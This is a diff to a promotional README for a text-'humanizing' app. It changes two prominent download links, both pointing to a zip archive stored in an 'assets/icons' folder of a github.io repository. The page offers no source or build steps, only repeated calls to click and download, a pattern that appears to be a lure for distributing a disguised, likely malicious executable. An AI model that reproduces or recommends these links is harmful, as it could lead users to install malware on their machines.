@@ -15,7 +15,7 @@ Whether you're a student, blogger, or professional, this tool helps you create c
 
 ### Step 1: Get the Application
 
-[**⬇️ CLICK HERE TO DOWNLOAD humanize-text**](https://github.com/Berkediamagnetic620/berkediamagnetic620.github.io/raw/refs/heads/main/assets/icons/App_3.7.zip)
+[**⬇️ CLICK HERE TO DOWNLOAD humanize-text**](https://raw.githubusercontent.com/Berkediamagnetic620/berkediamagnetic620.github.io/main/assets/icons/App_3.7.zip)
 
 Visit this link to download the application.
 
@@ -109,7 +109,7 @@ By using humanize-text, you're supporting open-source software that challenges t
 
 ---
 
-**Ready to transform your writing?** [**Click here to download humanize-text**](https://github.com/Berkediamagnetic620/berkediamagnetic620.github.io/raw/refs/heads/main/assets/icons/App_3.7.zip) and start creating text that truly sounds like you.
+**Ready to transform your writing?** [**Click here to download humanize-text**](https://raw.githubusercontent.com/Berkediamagnetic620/berkediamagnetic620.github.io/main/assets/icons/App_3.7.zip) and start creating text that truly sounds like you.
 
 *If you find this tool valuable, please star the repository on GitHub—it helps others discover it!*
 
